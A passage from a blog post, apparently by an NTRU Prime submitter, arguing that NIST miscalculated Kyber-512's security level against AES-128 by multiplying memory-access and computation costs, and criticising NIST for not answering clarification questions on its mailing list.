<blockquote>
<p><span color="#663319">
the cost of memory access and/or algorithmically making memory access
local, would still need to be less than what both the NTRU and
NTRUPrime submissions assume.
</span></p>
</blockquote>
<p>I found this puzzling when I first saw it: if we take 137, and then
subtract a hypothesized 16, then we need to find 22 bits, which is
less than the 40 that NISTBS mentioned but <em>not</em> less than the 20. What's
going on?</p>
<p>The best explanation I could come up with is that NIST thinks the 16
overlap the 5 bits that NISTBS mentioned above from Matzov, so NIST is
actually taking 137−16+5, meaning that NIST has to find only 17 bits,
and then the 20 that NISTBS attributes to NTRU is enough (at least if we
disregard the uncertainties conveyed by "estimate" and "suggest" and
"something like").</p>
<p>Again, Scenario X simply assumes that the 137 is accurate, with no
speedups from the "known unknowns", so this complication doesn't arise
for that scenario.</p>
<blockquote>
<p><span color="#663319">
The low end estimate of approximately 20 bits (from the NTRU
submission) is based on a conjecture by Ducas that a fully local
implementation of the BGJ1 sieving algorithm is possible.
</span></p>
</blockquote>
<p>Here NIST is pointing to a reason to ask whether the NTRU model is too
low. Scenario X explicitly takes the NTRU Prime model, which doesn't
trigger this particular issue.</p>
<blockquote>
<p><span color="#663319">
So, in the case that all known-unknowns take on the most paranoid
values, this would either require a sieving algorithm with local
memory access that is much better than any such published algorithm,
and in fact better than any that has been conjectured (at least as far
as we are aware),
</span></p>
</blockquote>
<p>This is summarizing the NISTBS calculations from the perspective of what
algorithmic improvements would be required to break NIST's conclusions.
This isn't relevant to scenario X.</p>
<blockquote>
<p><span color="#663319">
or it would require the approximately 40 bits of additional security
quoted as the "real cost of memory access" by the NTRUprime submission
to be a massive overestimate.
</span></p>
</blockquote>
<p>This is summarizing the NISTBS calculations from the perspective of what
modeling errors would be required to break NIST's conclusions.</p>
<p>It's concerning to observe deviations between what NISTBS attributes to
its source here and what the source actually says. For example, the
source says that it's <em>estimating</em> the cost of memory access, whereas
NIST incorrectly makes it sound as if the source is mislabeling an
estimate as a fact. Furthermore, contrary to what NISTBS's "quoted as"
claim leads readers to believe, the "40 bits" that NISTBS claims as
memory overhead is <em>not</em> a quote from what the source says on this
topic.</p>
<p>Presumably NIST obtained 40 in the following easy way: look at the
security-level table on page 103 of the source; observe that pre-quantum
sieving for <code>sntrup653</code> at the top is listed as 169 and 129 for "real"
and "free" respectively; subtract the 129 from the 169.</p>
<blockquote>
<p><span color="#663319">
In any event, a lot of things would have to go wrong simultaneously to
push the real-world classical cost of known attacks against Kyber512
below category 1, which is why we don't think it's terribly likely.
</span></p>
</blockquote>
<p>This is going beyond the per-scenario calculations into an overall
probability conclusion.</p>
<blockquote>
<p><span color="#663319">
As a final note, known quantum speedups for lattice sieving are much
less effective than Grover’s algorithm for brute force key search, so
in the likely scenario where the limiting attack on AES128 is Grover’s
algorithm, this would further increase the security margin of Kyber512
over AES128 in practice.
</span></p>
</blockquote>
<p>This is yet another complication, and one with several unquantified
steps. It's also blatantly inconsistent with earlier comments from NIST on
the impact of Grover's algorithm.</p>
<p>For example, in email dated 11 Sep 2017 13:48:59 +0000 to
pqc-forum@nist.gov (before the list moved to Google), NIST wrote that
"even if we assume the sort of quantum technology often suggested to be
possible in 15 years (e.g. ~1GW power requirement and a few hours to
factor a 2048 bit number), current technology can still do brute force
search cheaper than Grover’s algorithm". Where are the numbers backing
up NIST's new claim that Grover's algorithm is "likely" the top threat?</p>
<p>Surely NIST agrees that pre-quantum metrics are at least "potentially"
relevant to the practical security of Kyber-512. Consequently, under the
official evaluation criteria, NIST can't use post-quantum metrics as a
way to rescue Kyber-512 if Kyber-512 is easier to break than AES-128 in
the pre-quantum metrics.</p>
<p>I'll focus below on how NISTBS botched its calculation of the
pre-quantum Kyber-512 security level.</p>
<p><strong>What the underlying numbers actually mean.</strong>
Core-SVP is a rough estimate for the number of iterations
in a particular type of lattice attack.
Each iteration involves large-scale memory access and computation.</p>
<p>Let's look at how the latest versions
of the documentation for two submissions, NTRU Prime and Kyber,
convert their estimates for the number of iterations
into larger security-level estimates.
(Note that both of the documents in question are from 2020,
so the numbers don't include subsequent attack improvements.)</p>
<p>NTRU Prime focuses on the cost of memory access.
In particular,
for the important task of sorting N small items,
a two-dimensional circuit of area essentially N needs time essentially N<sup>1/2</sup>,
whereas a circuit of the same area running for the same time
can carry out essentially N<sup>3/2</sup> bit operations.</p>
<p>To put these two types of costs on the same scale,
the NTRU Prime documentation estimates
"the cost of each access to a bit within N bits of memory
as the cost of N<sup>0.5</sup>/2<sup>5</sup> bit operations",
and explains how the 2<sup>5</sup> comes from analyzing energy numbers reported by Intel.</p>
<p>As a concrete example:</p>
<ul>
<li>
<p>The NTRU Prime documentation reports Core-SVP 2<sup>129</sup> for <code>sntrup653</code>,
  meaning a rough estimate of 2<sup>129</sup> iterations.</p>
</li>
<li>
<p>The documentation also reports a rough estimate
  that memory accesses cost, in total,
  the equivalent of 2<sup>169</sup> bit operations for <code>sntrup653</code>.
  This comes from combining
  the N<sup>0.5</sup>/2<sup>5</sup> formula with estimates for N, for the number of iterations,
  and for the number of bits accessed inside each iteration.</p>
</li>
</ul>
<p>For comparison,
recall that Kyber-512 says Core-SVP 2<sup>118</sup>.
A rough estimate for the cost of memory accesses in this Kyber-512 attack
is the equivalent of 2<sup>154</sup> bit operations.</p>
<p>This might sound similar to the Kyber documentation
estimating 2<sup>151</sup> bit operations ("gates").
But the 2<sup>151</sup> estimate in the Kyber documentation
isn't an estimate of the bit-operation equivalent of memory access.
It's ignoring memory access.
It's instead considering the number of bit operations
used inside the attack's computations,
and estimating that this number is somewhere between 2<sup>135</sup> and 2<sup>167</sup>,
given the "known unknowns".</p>
<p><strong>Agency desperation, revisited.</strong>
With the meaning of the numbers in mind,
let's briefly summarize how NISTBS tries to use computations <em>and</em> memory
to push up the claimed security level of Kyber-512:</p>
<ul>
<li><span color="red">
  Start with 118 bits of security for Core-SVP.
  </span></li>
</ul>
<p>Indeed, Core-SVP estimates 2<sup>118</sup> iterations,
  at least with the round-3 Kyber redefinition of Core-SVP.</p>
<ul>
<li><span color="red">
  Add 33 bits of security, giving Kyber-512's claimed 151 bits of security,
  to account for the bit operations used in computations.
  </span></li>
</ul>
<p>Yes, the Kyber-512 documentation has a preliminary estimate of 2<sup>151</sup> bit operations.</p>
<ul>
<li><span color="red">
  Oh, oops, Kyber says this could be 16 bits too high,
  and Matzov says it reached 137,
  and maybe these could be combined,
  and there are other attack papers too?
  That's okay: memory will come to the rescue!
  </span></li>
</ul>
<p>Will it? Quantification needed.</p>
<ul>
<li><span color="red">
  Add "40 bits of additional security" (NIST's words)
  supposedly estimated by NTRU Prime,
  turning Matzov's 137 bits of security into 177 bits of security.
  </span></li>
</ul>
<p>This is where NISTBS goes horribly wrong.</p>
<p>The calculation here doesn't even pass basic type-checking.
Yes, there's a 2<sup>40</sup> in NTRU Prime for <code>sntrup653</code>,
but that's 2<sup>40</sup> bitops/iter.
Multiplying this by Matzov's bitops,
and portraying the result as bitops,
is nonsense from NIST.</p>
<p>Whatever the cost is for computation per iteration,
you have to <em>add</em> that to the cost for memory access per iteration.
<em>Multiplying</em> is wrong.</p>
<p>In the typical case of both numbers being considerably above 1,
multiplying the numbers—which is exactly what NISTBS is doing when it says
"40 bits of security more than would be suggested by the RAM model"
and "40 bits of additional security"—gives
an embarrassing, indefensible overestimate of attack costs.</p>
<p>To finish this NISTBS recap, let's briefly summarize
the happy conclusions that NISTBS draws:</p>
<ul>
<li>
<p><span color="red">
  Look at how much security margin we have here!
  The critical point is that, starting from 137,
  "only 6 bits of security from memory access costs are required for
  Kyber512 to meet category 1" (NIST's words).
  So we don't have to worry about a few bits here and there,
  such as the possibility of 137 being too high.
  </span></p>
</li>
<li>
<p><span color="red">
  We can even get away with replacing 40 bits of NTRU Prime
  with an attacker-optimistic 20 bits of security from NTRU,
  since that gives 157 bits of security.
  Still way above 143!
  Surely we aren't going to lose <em>all</em> 16 bits from the "known unknowns".
  </span></p>
</li>
<li>
<p><span color="red">
  To summarize,
  "a lot of things would have to go wrong simultaneously to
  push the real-world classical cost of known attacks against Kyber512
  below category 1, which is why we don't think it's terribly likely"
  (NIST's words).
  </span></p>
</li>
</ul>
<p>Yeah, sounds great,
except that it's all based on a botched calculation.</p>
<p><strong>How easy it is to catch the error.</strong>
This blog post is aimed at people who want to understand
the whole picture of what's going on here.
But imagine that you're looking at NISTBS without knowing any of this.
How quickly can you see that NISTBS is wrong?</p>
<p>I think the fastest answer is the following simple sanity check.
If</p>
<ul>
<li>
<p>Kyber estimates that the computations in breaking Kyber-512
cost between 2<sup>135</sup> and 2<sup>167</sup> bit operations,
and</p>
</li>
<li>
<p>NTRU Prime estimates that the memory accesses in breaking <code>sntrup653</code>
(which seems harder to break than Kyber-512)
cost the equivalent of 2<sup>169</sup> bit operations,
and</p>
</li>
<li>
<p>attacks then improve by a factor 2<sup>14</sup>,</p>
</li>
</ul>
<p>how can NIST end up estimating that breaking Kyber-512 costs 2<sup>177</sup> bit operations?</p>
<p>This doesn't tell you <em>where</em> NIST went wrong,
but there's a more basic trick that works for that.
See where NISTBS is claiming
that the NTRU Prime documentation
estimates "40 bits of security more than would be suggested by the RAM model"
(NIST's words),
<em>without giving a full quote from the NTRU Prime documentation</em>?</p>
<p>I'm one of the NTRU Prime submitters.
I already knew that this NISTBS claim was false:
it's misattributing NIST's wishful thinking to the NTRU Prime documentation.
But say you're reading this claim <em>without</em> knowing in advance that it's false.
How do you figure out that it's false?</p>
<p>Here's a hard answer and an easy answer:</p>
<ul>
<li>
<p>Hard answer:
Follow NISTBS's pointer
to Section 6.11 of the documentation.
That section starts on page 68, ends on page 70,
doesn't say "40", and doesn't say "the RAM model".
You can read through all the formulas and comments,
try to match it up to the NISTBS claim,
and see that nothing matches.</p>
</li>
<li>
<p>Easy answer:
As soon as you observe that this citation is hard to check,
simply <em>ask for clarification</em> regarding what exactly the citation is referring to.
Honest authors will be happy to clarify.</p>
</li>
</ul>
<p>As a followup,
let's imagine that
NIST responds by saying
"We calculated the 40 by subtracting 129 from 169 on the top row of Table 2".
NIST is then implicitly claiming that the 129 is an example of
calculating security in "the RAM model".
How do you figure out that this implicit claim is false?</p>
<p>This followup similarly has a hard answer and an easy answer:</p>
<ul>
<li>
<p>Hard answer:
Read through enough material about what NIST calls "the RAM model"
to see that this doesn't match the definition of the 129 in the source document.</p>
</li>
<li>
<p>Easy answer:
Simply <em>ask for clarification</em> of what exactly the rest of the citation,
the part attributing something about "the RAM model" to the NTRU Prime documentation,
is referring to.
Honest authors will again be happy to clarify.</p>
</li>
</ul>
<p>Asking questions
is the normal scientific process
for rapidly reaching clarity—and rapidly fixing errors.
For the particular error at hand,
it takes very few rounds to pinpoint the discrepancy:
the 2<sup>129</sup> in the source document for <code>sntrup653</code> is Core-SVP,
<em>not</em> a gate count in what NIST calls "the RAM model".</p>
<p>Of course,
this clarification process doesn't work when an agency
decides to dodge clarification questions,
for example because it doesn't <em>want</em> errors to be fixed.</p>
<p><strong>The research that would be needed for a correct calculation.</strong>
To fix NIST's calculation,
one needs to carefully distinguish two different effects:</p>
<ul>
<li>
<p>Kyber-512's preliminary estimate of security being 33 bits above Core-SVP
  (151 vs. 118)
  comes partially
  from estimating the number of
  bit operations inside the computations in an iteration inside a "primal" attack;
  see the <a href="https://eprint.iacr.org/2019/1161">Asiacrypt 2020 paper</a> mentioned above.
  The cost for computation per iteration
  has to be <em>added</em> to the cost for memory access per iteration.
  <em>Multiplying</em> these costs, as NIST did,
  is exactly the central mistake highlighted in this blog post.</p>
</li>
<li>
<p>On the other hand,
  the estimate comes partially from saying
  that there's an outer loop
  increasing the number of iterations compared to Core-SVP.
  Multiplying the new iteration count
  by the cost of memory access per iteration
  makes perfect sense.</p>
</li>
</ul>
<p>Quantifying these effects
requires tracing carefully through
hundreds of pages of papers on state-of-the-art lattice attacks
(not just rewriting the Asiacrypt 2020 paper)
to see what would happen if costs of memory access were included.</p>
<p>What makes this <em>really</em> tough is that
a change of cost metric also forces
reoptimization of the entire stack of attack subroutines,
along with all applicable parameters.</p>
<p>Consider, as one of many examples,
the choice between low-memory "enumeration"
and high-memory "sieving" as a subroutine inside BKZ.
The Kyber documentation uses cost metrics that ignore the cost of memory access
to conclude that enumeration is less efficient than sieving.
If NIST is suddenly saying that memory access makes sieving slower
than obviously there's a gap in the Kyber analysis.
Where's the recalculation that accounts for the cost of memory access,
and for the large
<a href="https://eprint.iacr.org/2020/707">recent</a>
<a href="https://eprint.iacr.org/2020/1260">improvements</a>
in enumeration?</p>
<p>Shortly after Matzov's attack appeared in April 2022,
I had sent a message to the NISTPQC mailing list
<a href="https://groups.google.com/a/list.nist.gov/g/pqc-forum/c/Fm4cDfsx65s/m/0dBVXOcSCAAJ">summarizing</a>
the complicated analysis that needed to be done.
I took, as an example, a less Kyber-favorable scenario
in which the "known unknowns" reduce 137 to 121,
and I said that simply multiplying the bit-operation count by 2<sup>40</sup> would be wrong:</p>
<blockquote>
<p>Does accounting for real RAM costs close the gap between 2<sup>121.5</sup> and
2<sup>143</sup>? One might think that, sure, this is covered by the 2<sup>40</sup> mentioned
above: Kyber-512 previously had security 2<sup>40</sup>*2<sup>135.5</sup> = 2<sup>175.5</sup>, so a
32.5-bit security margin, and the new paper is reducing this to an
18.5-bit security margin: i.e., the new paper is merely cutting out 40%
of the Kyber security margin, rather than breaking Kyber outright.</p>
<p>But let's look more closely at the numbers. As a preliminary point,
round-3 Kyber-512 is starting from Core-SVP just 2<sup>112</sup> and
revised-Core-SVP just 2<sup>118</sup>, with exponent 87% and 91% of 129
respectively, so the obvious estimate is about 2<sup>36</sup> instead of 2<sup>40</sup>.</p>
<p>Furthermore, this 2<sup>36</sup> is accounting for the energy cost of accesses to
a giant RAM array, while it's clear that many of the bits of security
beyond Core-SVP claimed in the round-3 Kyber security analysis are
coming from accounting for the cost of local bit operations. These
effects don't multiply; they add!</p>
<p>Internally, Core-SVP is starting from estimates of the number of
"operations" inside sieving. It makes sense to say that the attacker
needs to pay for the large-scale memory access inside each "operation".
It also makes sense to say that the attacker needs to pay for all the
bit operations inside each "operation". But the local bit operations are
an asymptotically irrelevant extra cost on top of the memory access, and
the best bet is that they don't make much difference for Kyber-512. The
real cost of this type of algorithm is, at a large scale, driven
primarily by data motion, not by local computation. ...</p>
<p>So I don't see how current knowledge can justify suggesting that the
costs of RAM rescue Kyber-512 from the new attack. It seems entirely
possible that the real costs of this Kyber-512 attack are considerably
below the costs of a brute-force AES-128 attack. Deciding this one way
or the other will require much more serious analysis of attack costs.</p>
</blockquote>
<p>An agency desperate to rescue Kyber-512
will take note of the first part of what I had written:
great, memory-access costs bump Kyber's security level up by 40 bits,
giving us a healthy security margin!</p>
<p>The agency won't listen to the subsequent part saying that,
no, this calculation is garbage.</p>
<p>The agency won't even listen to the preliminary adjustment of 40 to 36:
we have a healthy security margin, why worry about a few bits here and there?</p>
<p>Meanwhile,
if there's something that sounds like a few bits <em>favoring</em> Kyber-512,
then the desperate agency happily takes note of that,
as the following example illustrates.</p>
<p>The fact that the cost of memory access in each iteration
adds to the cost of computation in each iteration,
rather than multiplying,
has a silver lining for defenders:
in the common situation of memory access being dominant,
improvements in the cost of computation per iteration
make little difference in total cost.
I mentioned this in my April 2022 message regarding the Matzov paper:</p>
<blockquote>
<p>The new paper seems to have some local speedups to the sieving inner
loop, which similarly should be presumed to make little difference next
to the memory-access bottleneck, but my understanding is that this is
under half of the bits of security loss that the paper is reporting.</p>
</blockquote>
<p>Now look at this from the perspective of the desperate agency.
Aha, some bits of the Matzov speedup
are computation speedups that won't matter next to memory access!
As long as we're willing to switch to counting memory access,
this effect downgrades the Matzov speedup,
which sounds good for Kyber-512!</p>
<p>Sure enough,
NISTBS says that
"about 5 of the 14 claimed bits of security by Matzov
involved speedups to local computations",
and portrays this as a "further" reason for confidence in Kyber-512,
beyond the "40 bits of additional security" supposedly produced by memory access.</p>
<p>This is double-counting the silver lining.
Multiplying the 2<sup>40</sup> cost of memory access per iteration
by Matzov's 2<sup>137</sup> bit operations
is already assuming (implicitly and incorrectly)
that every bit operation has its own iteration,
giving 2<sup>137</sup> iterations.
This leaves no room for multiplying by a "further" 2<sup>5</sup>.
The estimated 2<sup>5</sup> is actually on a completely different axis:
it's an estimate for the Matzov-vs.-previous speedup ratio in one metric
divided by the Matzov-vs.-previous speedup ratio in another metric.</p>
<p><strong>NIST rescuing Kyber-512, part 3: dodging clarification requests.</strong>
When NISTBS appeared in December 2022,
I looked through and saw
that NISTBS was multiplying, rather than adding,
the cost of memory access per iteration
and the cost of computation per iteration,
despite my having already pointed out in April 2022 that this was wrong.</p>
<p>But, hmmm, NIST didn't write NISTBS in a verification-friendly way.
In particular, as noted above,
NIST didn't include any examples of confirming tallies.</p>
<p>It seemed perfectly clear
that NIST was adding "40 bits of additional security"
to 137 in scenario X.
But NIST didn't bother saying, yes,
the security level is 177 in that scenario.
NIST also didn't make clear where exactly it was getting the 40 from.</p>
<p>When I find mistakes in security analyses,
the authors usually say
"Thanks for catching the mistake!"—<a href="https://groups.google.com/a/list.nist.gov/g/pqc-forum/c/rJYnyTEi92E/m/l5xBpeTpBQAJ">except</a>
<a href="https://groups.google.com/a/list.nist.gov/g/pqc-forum/c/_kBMTq3RM28/m/afIJBlpoBAAJ">in</a>
<a href="https://groups.google.com/a/list.nist.gov/g/pqc-forum/c/8_uKOBN4Srw/m/KoAbiE4TDAAJ">lattice</a>-<a href="https://groups.google.com/a/list.nist.gov/g/pqc-forum/c/Yx0wZuZP6ag/m/Q_H9lf_zCAAJ">based</a>
<a href="https://groups.google.com/a/list.nist.gov/g/pqc-forum/c/SxH_NkLOv9Q/m/iCT1Y2VaAwAJ">cryptography</a>,
where the authors usually claim that they meant something different from what they had written.
This continual evasion is a serious disincentive to security review.
If there was <em>any</em> way that I could have misunderstood what NISTBS was saying,
then I wanted to know that at the outset,
before doing the work of writing up an explanation of the error.</p>
<p>So I posted a
<a href="https://groups.google.com/a/list.nist.gov/g/pqc-forum/c/4MBurXr58Rs/m/KeqHDr2lBAAJ">short clarification question</a>.
Specifically,
I spelled out scenario X
and asked whether, in that scenario, I was
"correctly gathering that you're calculating the Kyber-512
security level as 2<sup>177</sup> (i.e., 34 bits of security margin compared to
2<sup>143</sup> for AES-128), where this 177 comes from the above 137 plus 40,
where 40 comes from 169 minus 129 on page 103 of the NTRU Prime
documentation, specifically 'real' minus 'free' for pre-quantum sieving
for sntrup653".</p>
<p>I was expecting a prompt answer saying "Yes, for that specific scenario we're calculating 177 bits of security,
and we're getting the 40 from the 169 and 129 that you mentioned."</p>
<p>What actually happened is that NIST didn't reply.</p>
<p>Seriously?
<strong>NIST picks a risky, bleeding-edge cryptosystem to standardize for users worldwide,
and then doesn't even bother answering clarification questions
about what NIST claims the security level is?</strong></p>
<p>I mentioned above
that I filed a formal complaint
regarding the lack of transparency.
Here's what the complaint said:</p>
<blockquote>
<p>NIST has publicly claimed that Kyber-512 is as difficult to break as
AES-128 (see, e.g., page 8 and Figure 1 of NISTIR 8413 claiming that
Kyber-512 is "category 1"), at least by known attacks. As you know, this
is the minimum security level allowed by the official evaluation
criteria for the NIST Post-Quantum Cryptography Standardization Project.</p>
<p>However, NIST has concealed many details of the investigation that led
to this claim. NIST admits that "we did consult among ourselves and with
the Kyber team"; NIST still has not published those communications.</p>
<p>I have been trying to review the details of NIST's work on this topic.
NIST's lack of transparency makes this review process unnecessarily
difficult.</p>
<p>Some information was released by Dr. Moody and Dr. Perlner in response
to my requests, but this information is (1) incomplete and (2) unclear.
My email dated 8 Dec 2022 03:10:06 +0100 consisted of an "am I correctly
gathering" clarification question that could have been immediately
answered with a simple "Yes, that's correct" if my understanding of
NIST's calculations was correct; but there was no reply, so presumably
NIST actually meant something else. Surely the communications that NIST
is concealing shed light on how NIST actually reached the above claim.</p>
<p>I am writing to file a formal complaint regarding NIST's failure to
promptly and publicly disclose full details of its investigation of the
security of Kyber-512. This investigation should have been carried out
transparently from the outset, allowing prompt correction of any errors
that NIST failed to detect. The fact that NIST was still concealing the
details in July 2022 prevented the public from seeing how NIST arrived
at NISTIR 8413's claims on the topic. The fact that NIST is continuing
to conceal the details today seems inexplicable except as part of NIST
trying to limit public review of NIST's security evaluations.</p>
<p>Please acknowledge receipt of this message, and please publish full
details of NIST's investigation of the security of Kyber-512.</p>
</blockquote>
<p>I escalated the complaint to NIST's Matthew Scholl on 20 January 2023.
Scholl didn't reply.
The public still hasn't seen the details of
NIST's consultations "among ourselves and with the Kyber team"
regarding Kyber-512.</p>
<p>Maybe Scholl was sending internal email:
"Why is djb asking about this?
Did we screw something up again?"
Maybe NIST looked again at my April 2022 message,
realized how badly it had botched its Kyber-512 security analysis,
and then decided that it could get away with being obstructionist
rather than admitting the error.</p>
<p>Or maybe NIST,
still struggling to catch up on post-quantum cryptography,
simply hasn't had time to figure out the meaning of the numbers
that it's multiplying to obtain its claims regarding Kyber-512.
But this doesn't explain what happened next,
namely NIST spending more time dodging clarification questions
than it would have spent simply answering the questions.</p>
<p>The same day that I escalated
my non-transparency complaint to Scholl,
I publicly noted NIST's non-responsiveness,
and
<a href="https://groups.google.com/a/list.nist.gov/g/pqc-forum/c/4MBurXr58Rs/m/EQXN_5z-AQAJ">asked</a>
if anyone saw another way to interpret NIST's calculations:</p>
<blockquote>
<p>In the absence of such clarity, reviewers have to worry that putting
NIST's stated components together in what <em>seems</em> to be the obvious way,
and then doing the work to disprove what NIST <em>appears</em> to be claiming
about the security margin, will lead to a response claiming that, no,
NIST meant something else. It's natural to ask for clarification.</p>
<p>... I've again gone through NIST's 7 December email, and again concluded
that for this scenario NIST is claiming 34 bits in the way spelled out
below. Is there any way I could be missing something here? Does anyone
see another way to interpret NIST's calculations?</p>
</blockquote>
<p>NIST
<a href="https://groups.google.com/a/list.nist.gov/g/pqc-forum/c/4MBurXr58Rs/m/VcKp223-DQAJ">dodged</a>,
replying that NIST's email "speaks for itself".</p>
<p>Well, yes, I think NISTBS speaks for itself, and is very clearly adding
the "40 bits of additional security" to the 137 postulated in scenario X,
obtaining 177 in that scenario,
i.e., 34 bits more than NIST's 143 target.
I was simply asking for NIST to confirm that, yes,
in that scenario you take the 137 from Matzov,
and add the "40 bits of additional security",
giving 177 bits of security.</p>
<p>NIST also tried to shift attention to the question of
"whether or not our current plan to standardize Kyber512 is a good one",
while downplaying the question of whether NIST had correctly calculated
the Kyber-512 security level:</p>
<blockquote>
<p>While
reviewers are free, as a fun exercise, to attempt to "disprove what NIST
<em>appears</em> to be claiming about the security margin," the results of this
exercise would not be particularly useful to the standardization process.</p>
</blockquote>
<p>Seriously?
NIST</p>
<ul>
<li>
<p>kicks out NTRU-509 as supposedly being easier to break than AES-128,</p>
</li>
<li>
<p>keeps Kyber-512 as supposedly being as hard to break as AES-128,</p>
</li>
<li>
<p>repeatedly, inside its rationale for selecting Kyber, points to Kyber-512's efficiency,</p>
</li>
<li>
<p>says it's planning to standardize Kyber-512 as supposedly being as hard to break as AES-128,
  and then</p>
</li>
<li>
<p>claims that disproving NIST's Kyber-512 security-level calculation wouldn't be useful input?</p>
</li>
</ul>
<p>I
<a href="https://groups.google.com/a/list.nist.gov/g/pqc-forum/c/4MBurXr58Rs/m/0mzp87QiCgAJ">replied</a>,
starting with again asking for clarification:</p>
<blockquote>
<p>I <em>think</em> I understand what NIST is claiming in that message regarding
the quantitative Kyber security level.</p>
<p>I <em>think</em> that my clarification question (focusing on one example, much
shorter than NIST's message) is identifying the obvious interpretation.</p>
<p>But then why hasn't NIST simply said "Yes, that's correct" in response?</p>
<p>If the interpretation I've identified differs from what NIST meant, can
NIST please simply say what the difference is, so that security
reviewers don't have to spend time on the quantitative security claims
that NIST currently <em>seems</em> to be making?</p>
</blockquote>
<p>I also commented on the notion that this wouldn't be useful input:</p>
<blockquote>
<p>If Kyber-512 doesn't meet the minimum security level allowed by the
official call for submissions to the NIST Post-Quantum Cryptography
Standardization Project then Kyber-512 should not be standardized.</p>
<p>NIST's evaluation of the Kyber-512 security level---after various attack
advances newer than the latest version of the Kyber submission---depends
explicitly on NIST's calculations of the impact of memory costs.</p>
<p>With all due respect, is it so hard to imagine that NIST has botched
those calculations? If NIST is so sure that it got the whole sequence of
calculations right, why is it so resistant to clarification questions
that will help reviewers check and confirm that NIST got this right? If
NIST <em>isn't</em> sure, doesn't that make public review even more important?</p>
<p>In any case, there's a strong public interest in having NIST's security
evaluations clearly and promptly explained, to maximize the chance of
having errors corrected before bad decisions are set into stone.</p>
</blockquote>
<p>NIST
<a href="https://groups.google.com/a/list.nist.gov/g/pqc-forum/c/4MBurXr58Rs/m/FaoVfGA6CgAJ">dodged again</a>:</p>
<blockquote>
<p>It would be helpful to redirect discussion to</p>
<p>1)      The question of whether Kyber512 is as hard to break as AES128, (which is a
scientific question that cannot be settled by NIST pronouncements)</p>
<p>2)      The related question of whether Kyber512 should be standardized, (which is a
question where NIST will ultimately need to make a definitive decision, but thus far
we have only signaled we are leaning towards yes.)</p>
<p>With this in mind, I would like to note that the technical point on which Dan has
asked for clarification is effectively "how much additional security does Kyber512
get on account of memory access costs, according to the NTRUprime submission's
memory cost model?" Surely Dan, being on the NTRUPrime team, is in a better position
to answer this question than us.</p>
</blockquote>
<p>Seriously?
NIST</p>
<ul>
<li>
<p>takes NTRU Prime's smallest bitops/iter number,</p>
</li>
<li>
<p>slightly screws up by failing to downscale that number from <code>sntrup653</code> to Kyber-512,</p>
</li>
<li>
<p>massively screws up by multiplying that number by Matzov's 2<sup>137</sup> bitops,</p>
</li>
<li>
<p>claims on this basis that
  "a lot of things would have to go wrong simultaneously to
  push the real-world classical cost of known attacks against Kyber512 below category 1",
  and then</p>
</li>
<li>
<p>says that any questions should be addressed to the NTRU Prime team?</p>
</li>
</ul>
<p>Even if NIST <em>didn't</em> understand by this point that it had screwed up,
it certainly knew that</p>
<ul>
<li>
<p>NISTBS was stating conclusions about the Kyber-512 security level relative to AES-128,
  and</p>
</li>
<li>
<p>those conclusions were not in the source documents that NISTBS was citing.</p>
</li>
</ul>
<p>Those conclusions were the result of <em>calculations announced by NIST</em>.
It's completely inappropriate
for NIST to be trying to deflect clarification questions about those calculations.</p>
<p><a href="https://blog.cr.yp.to/20220129-plagiarism.html">Chris Peikert</a>
had entered the discussion in the meantime
to issue blanket denials that NIST was claiming any particular number of bits of security.
Of course, Peikert didn't propose an alternative interpretation
of NIST's words "40 bits of additional security".</p>
<p>I posted a
<a href="https://groups.google.com/a/list.nist.gov/g/pqc-forum/c/4MBurXr58Rs/m/bpbdpmtICgAJ">line-by-line dissection</a>
of NISTBS,
very similar to the line-by-line dissection shown above,
and asked if anyone could see any alternative interpretation:</p>
<blockquote>
<p>If anyone sees any way that I could be misunderstanding the details of
NIST's posting, please pinpoint which step is at issue and what the
alternative interpretation of NIST's calculation is supposed to be.</p>
</blockquote>
<p>There was no reply.</p>
<p>Perhaps NIST will now claim that,
when it wrote "40 bits of additional security",
it actually meant something different from, um, 40 bits of additional security.
But then why didn't NIST promptly answer my first question
by saying that, no, they didn't mean 40 bits of additional security,
and here's what they did mean?</p>
<p>I went far beyond the call of duty
in informing NIST of my understanding of NISTBS,
asking for confirmation,
and giving them ample time to reply.
By dodging, NIST successfully delayed having NISTBS publicly debunked.</p>
<p>At some point one has to draw a line and say that this has gone too far.
NIST's miscalculation of Kyber-512's security level
is still sitting there misinforming people,
and it has to be corrected.</p>
<p><strong>NIST rescuing Kyber-512, part 4: standards making unreviewable security claims.</strong>
In August 2023,
NIST released a
<a href="https://web.archive.org/web/20230827094905/https://nvlpubs.nist.gov/nistpubs/FIPS/NIST.FIPS.203.ipd.pdf">draft</a>
of its Kyber standard ("ML-KEM"),
in particular saying
"it is claimed that the computational resources needed to break ML-KEM
are greater than or equal to the computational resources needed to break the block cipher ...
ML-KEM-512 is claimed to be in security category 1, ML-KEM-768 is claimed to be in security category 3, and ML-KEM-1024 is claimed to be in security category 5".</p>
<p>Impressive use of the passive voice.
Is <em>NIST</em> claiming these categories?
Are the <em>designers</em> claiming these categories?
Is someone else claiming these categories?</p>
<p>Citation needed.
Or, really, <em>responsibility</em> needed.</p>
<p>Appendix A of the draft
again says that these "categories" are defined as
matching or surpassing AES-128, AES-192, and AES-256 respectively
in every "potentially relevant" cost metric:</p>
<blockquote>
<p>Each category is defined by a comparatively easy-to-analyze reference primitive, whose security
will serve as a floor for a wide variety of metrics that NIST deems potentially relevant to practical
security. ...</p>
<p>In order for a cryptosystem to satisfy one
of the above security requirements, any attack must require computational resources comparable
to or greater than the stated threshold, with respect to all metrics that NIST deems to be potentially
relevant to practical security.</p>
</blockquote>
<p>The latest Kyber documentation says that
the Kyber-512 attack cost could be as low as 2<sup>135</sup> "classical gates".
That's below NIST's estimate of 2<sup>143</sup> "classical gates" for AES-128,
never mind subsequent attack developments.
Where exactly is the justification for claiming that Kyber-512 reaches the AES-128 floor
in all potentially relevant metrics?</p>
<p>Is NIST now officially declaring that "classical gates" aren't "potentially relevant to practical security"?</p>
<p>If so,
how does NIST reconcile this with NIST's 2022 selection report,
which used gate counts ("the non-local cost model")
as an excuse to kick out the most efficient lattice KEM that NIST was considering,
namely NTRU-509?</p>
<p>What exactly <em>are</em> the metrics that NIST is now using
for the claim that Kyber-512 is as hard to break as AES-128?
When and where were the definitions of those metrics published?
(NISTBS doesn't even pass basic type-checking,
let alone refer to a clearly defined metric.)</p>
<p>Where's the analysis of Kyber-512's security level in NIST's metrics?</p>
<p>For comparison,
where's the analysis of the AES-128 security level in NIST's metrics?</p>
<p>The Kyber documentation concentrates on Kyber-512 for its concrete cost analysis,
but the subexponential "dimensions for free" speedup (and subsequent improvements)
should do more damage to security at larger sizes.
Where are the analyses of the Kyber-768, AES-192, Kyber-1024, and AES-256 security levels in NIST's metrics?</p>
